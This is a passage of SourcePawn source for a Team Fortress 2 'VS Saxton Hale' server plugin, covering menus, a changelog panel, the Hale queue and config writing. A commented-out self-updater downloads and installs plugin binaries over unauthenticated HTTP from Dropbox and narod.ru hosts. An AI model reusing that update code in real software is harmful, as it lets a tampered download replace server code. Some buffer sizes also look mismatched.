		for (new i = 0; i < count; i+=2)
		{
			TF2Items_SetAttribute(hWeapon, i2, StringToInt(atts[i]), StringToFloat(atts[i+1]));
			i2++;
		}
	}
	else
		TF2Items_SetNumAttributes(hWeapon, 0);
	if (hWeapon==INVALID_HANDLE)
		return -1;
	new entity = TF2Items_GiveNamedItem(client, hWeapon);
	EquipPlayerWeapon(client, entity);
	return entity;
}

public HintPanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		return;   
	}
}
  
public Action:HintPanel(client, Args)
{
	new Handle:panel = CreatePanel();
	decl String:s[512];
	switch (Special)
	{
		case 0: 
			Format(s,512,"%t","help_hale");
		case 1:
			Format(s,512,"%t","help_vagineer");
		case 2: 
			Format(s,512,"%t","help_hhh");
	}
	DrawPanelText(panel,s);
	if (tf_medieval)
	{
		Format(s,512,"%t","respawn_on_medieval");
		DrawPanelText(panel,s);
	}
	Format(s,512,"%t","menu_6");
	DrawPanelItem(panel,s);
	SendPanelToClient(panel, client, QueuePanelH, 9001);
	CloseHandle(panel);
	return Plugin_Continue;
}

public QueuePanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (param1==9001)
	{
		if (!bSpecials)
		{
			Special=0;
			return true;  
		}
		Special=Incoming;
		if (Special==0)
		{
			Special=GetRandomInt(0,15);
			if ((Special==12) || (Special==13))
				Special=1;
			else if ((Special==11) || (Special==10))
				Special=2;
			else
				Special=0;	
			
		}
		Incoming=0;
		return true;  
	}
	if (action == MenuAction_Select)
		return false; 
	return false; 
}
  
public Action:QueuePanel(client, Args)
{
	if (!Enabled)
		return Plugin_Continue;
	if (RoundCount<2)
	{
		PrintToChat(client,"%t","queue",3-RoundCount);
		return Plugin_Continue;
	}
	new Handle:panel = CreatePanel();
	decl String:s[512];
	Format(s,512,"%t","thequeue");	
	SetPanelTitle(panel, s);
	new tHale=Hale;			
	if (!IsValidEdict(tHale) || !IsClientInGame(tHale))
		tHale=FindNextHale(tHale);		
	GetClientName(tHale, s, 64);
	Format(s,512,"%t %s","curret_hale_is",s);
	DrawPanelText(panel,s);
	new i;
	do
	{
		tHale=FindNextHale(tHale);	
		if (IsValidEdict(tHale) && IsClientInGame(tHale))
		{
			GetClientName(tHale, s, 64);
			DrawPanelItem(panel,s);
			i++;
		}
	}
	while ((tHale!=Hale) && (i<10));
	SendPanelToClient(panel, client, QueuePanelH, 9001);
	CloseHandle(panel);
	return Plugin_Continue;
}

public HalePanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
			Command_GetHP(param1, 0);
		else if (param2==2)
			HelpPanel(param1, 0);
		else if (param2==3)
			HelpPanel2(param1, 0);
		else if (param2==4)
			NewPanel(param1, 0);
		else if (param2==5)	
			QueuePanel(param1,0);
		else
			return;   
	}
}
  
public Action:HalePanel(client, Args)
{
	if (!Enabled)
		return Plugin_Continue;
	new Handle:panel = CreatePanel();
	decl String:s[256];
	Format(s,256,"%t","menu_1");
	SetPanelTitle(panel, s);
	Format(s,256,"%t","menu_2");
	DrawPanelItem(panel, s);
	Format(s,256,"%t","menu_3");
	DrawPanelItem(panel, s);
	Format(s,256,"%t","menu_7");
	DrawPanelItem(panel, s);
	Format(s,256,"%t","menu_4");
	DrawPanelItem(panel, s);
	Format(s,256,"%t","menu_5");
	DrawPanelItem(panel, s);
	Format(s,256,"%t","menu_6");
	DrawPanelItem(panel, s);
	SendPanelToClient(panel, client, HalePanelH, 9001);
	CloseHandle(panel);
	return Plugin_Continue;
}

public NewPanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
		{
			if (!curhelp[param1])
				NewPanel(param1,999);
			else if (curhelp[param1]==999)
				NewPanel(param1,126);
			else if (curhelp[param1]==126)
				NewPanel(param1,125);
			else if (curhelp[param1]==125)
				NewPanel(param1,124);
			else if (curhelp[param1]==124)
				NewPanel(param1,123);
			else if (curhelp[param1]==123)
				NewPanel(param1,122);
			else if (curhelp[param1]==122)
				NewPanel(param1,120);
			else if (curhelp[param1]==120)
				NewPanel(param1,112);
			else if (curhelp[param1]==112)
				NewPanel(param1,111);
			else if (curhelp[param1]==111)
				NewPanel(param1,110);
			else
				NewPanel(param1,100);
		}
		else if (param2==2)
		{
			if (curhelp[param1]==100)
				NewPanel(param1,110);
			else if (curhelp[param1]==110)
				NewPanel(param1,111);
			else if (curhelp[param1]==111)
				NewPanel(param1,112);
			else if (curhelp[param1]==112)
				NewPanel(param1,120);
			else if (curhelp[param1]==120)
				NewPanel(param1,122);
			else if (curhelp[param1]==122)
				NewPanel(param1,123);
			else if (curhelp[param1]==123)
				NewPanel(param1,124);
			else if (curhelp[param1]==124)
				NewPanel(param1,125);
			else if (curhelp[param1]==126)
				NewPanel(param1,127);
			else if (curhelp[param1]==127)
				NewPanel(param1,999);
			else
				NewPanel(param1,0);
		}
		if (param2==3)
			return;  
	}
}
  
public Action:NewPanel(client, Args)
{
	if (!Enabled)
		return Plugin_Continue;
	curhelp[client]=Args;
	new Handle:panel = CreatePanel();
	decl String:s[90];
	if (!Args)
		Format(s,90,"=%t%s:=","whatsnew",PLUGIN_VERSION);
	else if (Args==999)
		Format(s,90,"=%t VS Christian Brutal Sniper: %i.%i=","whatsnew",Args/100,Args%100);
	else
		Format(s,90,"=%t%i.%i:=","whatsnew",Args/100,Args%100);
	SetPanelTitle(panel, s);
	if (!Args)
	{
		DrawPanelText(panel, "VS Saxton Hale Mode is back!");
		DrawPanelText(panel, "1)Christian Brutal Sniper is a regular character.");
		DrawPanelText(panel, "2)CBS has 3 melee weapons ad bow-rage.");
		DrawPanelText(panel, "3)Added new lines for Vagineer.");
		DrawPanelText(panel, "4)Updated models of Vagineer and HHH jr.");
	}
	else if (Args==999)
		DrawPanelText(panel, "Attachables are broken. Many \"thx\" to Valve.");
	else if (Args==126)
	{
		DrawPanelText(panel, "1)Added the second URL for auto-update.");
		DrawPanelText(panel, "2)Fixed problems, when auto-update was corrupt plugin.");
		DrawPanelText(panel, "3)Added a question for the next Hale, if he want to be him. (/haleme)");
		DrawPanelText(panel, "4)Eyelander and Half-Zatoichi was replaced with Claidheamh Mor.");
		DrawPanelText(panel, "5)Fan O'War replaced with Bat.");
		DrawPanelText(panel, "6)Dispenser and TP won't be destoyed after Engineer's death.");
		DrawPanelText(panel, "7)Mode uses the localization file.");
		DrawPanelText(panel, "8)Saxton Hale will be choosed randomly for the first 3 rounds (then by queue).");
	}
	else if (Args==125)
	{
		DrawPanelText(panel, "1)Fixed silent HHHjr's rage.");
		DrawPanelText(panel, "2)Now bots (sourcetv too) do not will be Hale");
		DrawPanelText(panel, "3)Fixed invalid uber on Vagineer's head.");	
		DrawPanelText(panel, "4)Fixed other little bugs.");	
	}
	else if (Args==124)
	{
		DrawPanelText(panel, "1)Fixed destroyed buildables associated with spy's fake death.");
		DrawPanelText(panel, "2)Syringe Gun replaced with Blutsauger.");
		DrawPanelText(panel, "3)Blutsauger, on hit: +5 to uber-charge.");
		DrawPanelText(panel, "4)Removed crits from Blutsauger.");
		DrawPanelText(panel, "5)CnD replaced with Invis Watch.");
		DrawPanelText(panel, "6)Fr.Justice replaced with shotgun");
		DrawPanelText(panel, "7)Fists of steel replaced with fists.");
		DrawPanelText(panel, "8)KGB replaced with GRU.");
		DrawPanelText(panel, "9)Added /haleclass.");
		DrawPanelText(panel, "10)Medic gets assist damage scores (1/2 from healing target's damage scores, 1/1 when uber-charged)");
	}
	else if (Args==123)
	{
		DrawPanelText(panel, "1)Added Super Duper Jump to rescue Hale from pit");
		DrawPanelText(panel, "2)Removed pyro's ammolimit");
		DrawPanelText(panel, "3)Fixed little bugs.");
	}
	else if (Args==122)
	{
		DrawPanelText(panel, "1.21)Point will be enabled when X or less players be alive.");
		DrawPanelText(panel, "1.22)Now it's working :) Also little optimize about player count.");
	}
	else if (Args==120)
	{
		DrawPanelText(panel, "1)Added new Hale's phrases.");
		DrawPanelText(panel, "2)More bugfixes.");
		DrawPanelText(panel, "3)Improved super-jump.");
	}
	else if (Args==112)
	{
		DrawPanelText(panel, "1)More bugfixes.");
		DrawPanelText(panel, "2)Now \"(Hale)<mapname>\" can be nominated for nextmap.");
		DrawPanelText(panel, "3)Medigun's uber gets uber and crits for Medic and his target.");
		DrawPanelText(panel, "4)Fixed infinite Specials.");
		DrawPanelText(panel, "5)And more bugfixes.");
	}
	else if (Args==111)
	{
		DrawPanelText(panel, "1)Fixed immortal spy");
		DrawPanelText(panel, "2)Fixed crashes associated with classlimits.");
	}
	else if (Args==110)
	{
		DrawPanelText(panel, "1)Not important changes on code.");
		DrawPanelText(panel, "2)Added hale_enabled convar.");
		DrawPanelText(panel, "3)Fixed bug, when all hats was removed...why?");
	}
	else if (Args==100)
	{
		DrawPanelText(panel, "Released!!!");
		DrawPanelText(panel, "On new version you will get info about changes.");
	}
	if (Args!=100)
		Format(s,90,"older");
	else
		Format(s,90,"noolder");
	DrawPanelItem(panel, s); 
	if (Args>100)
		Format(s,90,"newer");
	else
		Format(s,90,"nonewer");
	DrawPanelItem(panel, s); 
	Format(s,512,"%t","menu_6");
	DrawPanelItem(panel,s);   
	SendPanelToClient(panel, client, NewPanelH, 9001);
	CloseHandle(panel);
	return Plugin_Continue;
}

public HelpPanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		return;   
	}
}
  
public Action:HelpPanel(client, Args)
{
	if (!Enabled)
		return Plugin_Continue;
	new Handle:panel = CreatePanel();
	decl String:s[512];
	Format(s,512,"%t","help_mode");
	DrawPanelItem(panel,s); 
	Format(s,512,"%t","menu_6");
	DrawPanelItem(panel,s);  
	SendPanelToClient(panel, client, HelpPanelH, 9001);
	CloseHandle(panel);
	return Plugin_Continue;
}

public Action:HelpPanel2(client, Args)
{
	if (!Enabled)
		return Plugin_Continue;
	decl String:s[512];
	switch (TF2_GetPlayerClass(client))
	{
		case TFClass_Scout:
			Format(s,512,"%t","help_scout");
		case TFClass_Soldier:
			Format(s,512,"%t","help_soldier");
		case TFClass_Pyro:
			Format(s,512,"%t","help_pyro");
		case TFClass_DemoMan:
			Format(s,512,"%t","help_demo");
		case TFClass_Heavy:
			Format(s,512,"%t","help_heavy");
		case TFClass_Engineer:
			Format(s,512,"%t","help_eggineer");
		case TFClass_Medic:
			Format(s,512,"%t","help_medic");
		case TFClass_Sniper:
			Format(s,512,"%t","help_sniper");
		case TFClass_Spy:
			Format(s,512,"%t","help_spie");
	}
	new Handle:panel = CreatePanel();
	if (TF2_GetPlayerClass(client)!=TFClass_Sniper)
		Format(s,512,"%t\n%s","help_melee",s);
	SetPanelTitle(panel,s);	
	DrawPanelItem(panel,"Exit");
	SendPanelToClient(panel, client, QueuePanelH, 20);
	CloseHandle(panel);
	return Plugin_Continue;
}
public HelpPanelH1(Handle:menu, MenuAction:action, param1, param2)
{
	if (action == MenuAction_Select)
	{
		if (param2==1)
			HelpPanel(param1, 0);
		else if (param2==2)
			return;   
	}
}

public Action:HelpPanel1(client, Args)
{
	if (!Enabled)
		return Plugin_Continue;
	new Handle:panel = CreatePanel();
	SetPanelTitle(panel, "Hale is unusually strong.\nBut he doesn't use weapons, because\nhe believes that problems should be\nsolved with bare hands.");
	DrawPanelItem(panel, "Back"); 
	DrawPanelItem(panel, "Exit");   
	SendPanelToClient(panel, client, HelpPanelH1,9001);
	CloseHandle(panel);
	return Plugin_Continue;
}
  
public SkipHalePanelH(Handle:menu, MenuAction:action, param1, param2)
{
	if (IsClientConnected(param1))
	{
		if (action == MenuAction_Select)
		{
			if (param2==1)
				bSkipNextHale=false;
			else
				bSkipNextHale=true;
		}
		PrintToChat(param1,"%t","skip_hale_2");
	}
}

public Action:SkipHalePanel(client, Args)
{
	if (!Enabled || !IsClientConnected(client)) 
		return Plugin_Continue;
	if (client!=FindNextHale(Hale))
	{
		PrintToChat(client,"%t","skip_hale");
		return Plugin_Continue;
	}
	new Handle:panel = CreatePanel();
	decl String:s[256];
	Format(s,256,"%t","skip_hale_q");
	SetPanelTitle(panel, s);
	Format(s,256,"%t","skip_hale_da");
	DrawPanelItem(panel, s);  
	Format(s,256,"%t","skip_hale_niet");
	DrawPanelItem(panel, s);  
	SendPanelToClient(panel, client, SkipHalePanelH,9001);
	CloseHandle(panel);
	return Plugin_Continue;
}


public Action:HookSound(clients[64], &numClients, String:sample[PLATFORM_MAX_PATH], &ent, &channel, &Float:volume, &level, &pitch, &flags)
{		
	if (!Enabled || (ent!=Hale))
		return Plugin_Continue;
	if (StrEqual(sample,"vo/engineer_LaughLong01.wav"))
	{
		Format(sample,256,"../%s",VagineerKSpree);
		return Plugin_Changed;
	}
	if (StrEqual(sample,"weapons/bow_shoot.wav"))
	{
		UberRageCount--;
		SetEntData(Hale, FindDataMapOffs(Hale, "m_iAmmo")+4, UberRageCount);
		if (UberRageCount<=0)
			TF2_RemoveWeaponSlot(Hale, 0);
	}
	if ((Special!=4) && !StrContains(sample,"vo") && (StrContains(sample,"halloween_boss")==-1))
		return Plugin_Handled;
	return Plugin_Continue;
}


/*
Ennui()
{
	new String:s[PLATFORM_MAX_PATH];
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/disabled");
	if (!DirExists(s))
		CreateDirectory(s,dirMode);
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/saxtonhale.smx");
	if (FileExists(s))
	{
		new Handle:hFileR = OpenFile(s, "rb");	
		BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/disabled/saxtonhale.smx");
		new Handle:hFileW = OpenFile(s, "wb");	
		decl data;
		while (ReadFileCell(hFileR,data,1))
			WriteFileCell(hFileW,data,1);
		CloseHandle(hFileR);
		CloseHandle(hFileW);
	}
	
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/disabled/saxtonhale_autoupdated.smx");
	new Handle:socket = SocketCreate(SOCKET_TCP, OnSocketError);	
	new Handle:hFile = OpenFile(s, "wb");	
	SocketSetArg(socket, hFile);
	zepos=-1;
	SocketConnect(socket, OnSocketConnected, OnSocketReceive, OnSocketDisconnected, "dl.dropbox.com", 80);
}

UpdateLoc()
{
	decl String:s[PLATFORM_MAX_PATH];
	decl String:s2[PLATFORM_MAX_PATH];
	new count=0;
	new bool:bOnCheck=false;
	new Handle:filew;
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"translations/saxtonhale.phrases.txt");	
	BuildPath(Path_SM,s2,PLATFORM_MAX_PATH,"translations/saxtonhale.phrases.backup");
	if (FileExists(s))
	{
		CPrintToChatAll("See");
		DeleteFile(s2);
		RenameFile(s2,s);
		filew = OpenFile(s, "w");
		new Handle:filer = OpenFile(s2, "r");
		ReadFileLine(filer, s, sizeof(s));
		if (StrContains(s,"Phrases",false)==-1)
			WriteFileLine(filew,"\"Phrases\"\n{",false);
		else 
		{
			WriteFileString(filew,s,false);
			CPrintToChatAll("%s",s);
			while(ReadFileLine(filer, s, sizeof(s)))
			{
				if ((StrContains(s,"}",false)!=-1) && (StrContains(s,"\"",false)==-1))
				{
					if (ReadFileLine(filer, s, sizeof(s)))
					{
						if (StrContains(s,"\"",false)!=-1)
						{
							WriteFileLine(filew,"	}");
							WriteFileString(filew,s,false);
							CPrintToChatAll("%s",s);
							count++;
						}
					}
				}
				else
				{
					WriteFileString(filew,s,false);
					CPrintToChatAll("%s",s);
				}
			}
			WriteFileString(filew,"	}\n",false);
			count++;
		}
		CloseHandle(filer);	
	}
	else
	{
		CPrintToChatAll("Don't See");
		filew = OpenFile(s, "w");
		WriteFileLine(filew,"\"Phrases\"\n{",false);
	}
	new targetcount=sizeof(keyvalues);
	if (count<targetcount)
	{
		bOnCheck=true;
		for(new i=count;i<targetcount;i++)
		{
			CPrintToChatAll("write %s (%i)",keyvalues[i],i);
			if (StrContains(keyformats[i],"{")==-1)
				WriteFileLine(filew,"	\"%s\"\n	{\n		\"en\"	\"%s\"",keynames[i],keyvalues[i]);
			else
				WriteFileLine(filew,"	\"%s\"\n	{\n		\"#format\" \"%s\"\n		\"en\"	\"%s\"",keynames[i],keyformats[i],keyvalues[i]);
			WriteFileLine(filew,"	}");
		}
	}
	WriteFileCell(filew,'}',1);	
	CloseHandle(filew);
	if (bOnCheck && Enabled2)
	{
		GetNextMap(s, 64);
		new Handle:fileh = OpenFile("bNextMapToHale", "w");
		WriteFileLine(fileh, s,false);
		CloseHandle(fileh);
		Format(s,64,"sm_map %s",s);
		//ServerCommand(s);
	}
}

public OnSocketConnected(Handle:socket, any:arg)
{
	decl String:requestStr[100];
	Format(requestStr, sizeof(requestStr), "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", "u/23073094/saxtonhale.smx", "dl.dropbox.com");
	SocketSend(socket, requestStr);
}

public OnSocketConnected_narod(Handle:socket, any:arg)
{
	decl String:requestStr[100];
	Format(requestStr, sizeof(requestStr), "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", "tf/saxtonhale/saxtonhale.smx", "danetnavern0.narod.ru");
	SocketSend(socket, requestStr);
}

public OnSocketConnectedA(Handle:socket, any:arg)
{
	decl String:requestStr[100];
	Format(requestStr, sizeof(requestStr), "GET /%s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", "tf/saxtonhale/saxtonhale.sp", "danetnavern0.narod.ru");
	SocketSend(socket, requestStr);
}

public OnSocketReceive(Handle:socket, String:receiveData[], const dataSize, any:hFile)
{	
	zepos=StrContains(receiveData,"FFPS",false);
	if (zepos==-1)
		zepos++;
	for(new i=zepos; i <dataSize; i++)
		WriteFileCell(hFile, receiveData[i], 1);
}

public OnSocketReceiveA(Handle:socket, String:receiveData[], const dataSize, any:hFile)
{	
	zepos=StrContains(receiveData,"//===VS Saxton Hale Mode===",false);
	if (zepos==-1)
		zepos++;
	for(new i=zepos; i <dataSize; i++)
		WriteFileCell(hFile, receiveData[i], 1);
}

public OnSocketDisconnected(Handle:socket, any:hFile)
{
	CloseHandle(hFile);
	CloseHandle(socket);
	decl String:s[PLATFORM_MAX_PATH];
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/disabled/saxtonhale_autoupdated.smx");
	if (FileSize(s)>40000)
		ReplacePluginFile(socket,hFile,s);
	else
	{
		socket = SocketCreate(SOCKET_TCP, OnSocketError_narod);	
		hFile = OpenFile(s, "wb");	
		SocketSetArg(socket, hFile);
		zepos=-1;
		SocketConnect(socket, OnSocketConnected_narod, OnSocketReceive, OnSocketDisconnected_narod, "danetnavern0.narod.ru", 80);
	}
}

public OnSocketDisconnected_narod(Handle:socket, any:hFile)
{
	CloseHandle(hFile);
	CloseHandle(socket);
	decl String:s[PLATFORM_MAX_PATH];
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/disabled/saxtonhale_autoupdated.smx");
	if (FileSize(s)>40000)
		ReplacePluginFile(socket,hFile,s);
}

public ReplacePluginFile(Handle:socket, any:hFile, String:s[PLATFORM_MAX_PATH])
{
	new Handle:hFileR = OpenFile(s, "rb");	
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/saxtonhale.smx");
	new Handle:hFileW = OpenFile(s, "wb");	
	decl data;
	while (ReadFileCell(hFileR,data,1))
		WriteFileCell(hFileW,data,1);
	CloseHandle(hFileR);
	CloseHandle(hFileW);
		
	socket = SocketCreate(SOCKET_TCP, OnSocketErrorA);	
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"scripting/saxtonhale.sp");
	hFile = OpenFile(s, "wb");	
	SocketSetArg(socket, hFile);
	zepos=-1;
	SocketConnect(socket, OnSocketConnectedA, OnSocketReceiveA, OnSocketDisconnectedA, "danetnavern0.narod.ru", 80);
}

public OnSocketDisconnectedA(Handle:socket, any:hFile)
{
	CloseHandle(hFile);
	CloseHandle(socket);
	//UpdateLoc();
}

public OnSocketError(Handle:socket, const errorType, const errorNum, any:hFile)
{
	LogError("socket error %d (errno %d) (on get plugin)", errorType, errorNum);
	CloseHandle(hFile);
	CloseHandle(socket);
	
	decl String:s[PLATFORM_MAX_PATH];
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"plugins/disabled/saxtonhale_autoupdated.smx");
	socket = SocketCreate(SOCKET_TCP, OnSocketError_narod);	
	hFile = OpenFile(s, "wb");	
	SocketSetArg(socket, hFile);
	zepos=-1;
	SocketConnect(socket, OnSocketConnected_narod, OnSocketReceive, OnSocketDisconnected_narod, "danetnavern0.narod.ru", 80);
}

public OnSocketError_narod(Handle:socket, const errorType, const errorNum, any:hFile)
{
	LogError("socket error %d (errno %d) (on get plugin)", errorType, errorNum);
	CloseHandle(hFile);
	CloseHandle(socket);
}

public OnSocketErrorA(Handle:socket, const errorType, const errorNum, any:hFile)
{
	LogError("socket error %d (errno %d) (on get sources)", errorType, errorNum);
	CloseHandle(hFile);
	CloseHandle(socket);
	//UpdateLoc();
}
*/
SetAmmo(client, slot, ammo)
{
	new weapon = GetPlayerWeaponSlot(client, slot);
	if (IsValidEntity(weapon))
	{
		new iOffset = GetEntProp(weapon, Prop_Send, "m_iPrimaryAmmoType", 1)*4;
		new iAmmoTable = FindSendPropInfo("CTFPlayer", "m_iAmmo");
		SetEntData(client, iAmmoTable+iOffset, ammo, 4, true);
	}
}

stock GetHealingTarget(client)
{
	new String:s[64];
	new medigun = GetPlayerWeaponSlot(client, 1);
	if ((medigun<=0) || !IsValidEdict(medigun))
		return -1;
	GetEdictClassname(medigun, s, sizeof(s));
	if(StrEqual(s, "tf_weapon_medigun"))
	{
		if( GetEntProp(medigun, Prop_Send, "m_bHealing") == 1 )
			return GetEntPropEnt(medigun, Prop_Send, "m_hHealingTarget");
	}		
	return -1;
}

WriteConfig()
{
	new String:s[256];
	new String:s2[PLATFORM_MAX_PATH];
	
	BuildPath(Path_SM,s2,PLATFORM_MAX_PATH,"configs/saxton_hale_config.cfg");
	new Handle:fileh = OpenFile(s2, "wb");
	Format(s,256,"hale_speed %f",HaleSpeed);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_point_delay %i",PointDelay);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_rage_damage %i",RageDMG);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_rage_dist %f",RageDist);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_announce %f",Announce);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_specials %i",bSpecials);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_point_type %i",PointType);
	WriteFileLine(fileh, s,false);
	
	Format(s,256,"hale_point_delay %i",PointDelay);
	WriteFileLine(fileh, s,false);
					
	Format(s,256,"hale_point_alive %i",AliveToEnable);
	WriteFileLine(fileh, s,false);
	
	CloseHandle(fileh);
}